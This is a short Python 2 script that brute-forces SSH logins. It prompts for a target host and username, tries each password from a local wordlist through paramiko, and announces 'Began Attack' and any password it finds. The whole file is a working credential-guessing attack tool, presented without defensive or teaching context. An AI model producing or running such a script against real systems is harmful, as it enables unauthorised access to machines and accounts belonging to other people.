import paramiko, sys, os, socket

def ssh_connect(password, code = 0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password = password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error, e:
        code = 2

    ssh.close()

    return code

global host, username, line, input_file

line = "\n" + "-"*30 + "\n"

try:
    host = raw_input("[*] Enter target host address: ")
    username = raw_input("[*] Enter ssh username: ")
    #input_file = raw_input("[*] Enter SSH Password File: ")
    input_file = "passwordFile.txt"

    if os.path.exists(input_file) == False:
        print '\n[*] File path does not exist'
        sys.exit(4)

except KeyboardInterrupt:
    print '\n\n[*] Terminated program'
    sys.exit(3)

input_file = open(input_file)

print '\n\n' + "="*30 + "Began Attack" + "="*30 + "\n"

for i in input_file.readlines():
    password = i.strip("\n")
    try:
        response = ssh_connect(password)
        
        if response == 0:
            print("%s[*] User: %s [*] Pass Found: %s%s" % (line, username, password, line))
            sys.exit(0)
        elif response == 1:
            print("[*] User: %s [*] Pass: %s => Login Incorrect !!! <=" % (username, password))
        elif response == 2:
            print("[*] Connection could not be established to address: %s" % (host))
            sys.exit(2)

    except Exception, e:
        print e
        pass

input_file.close()
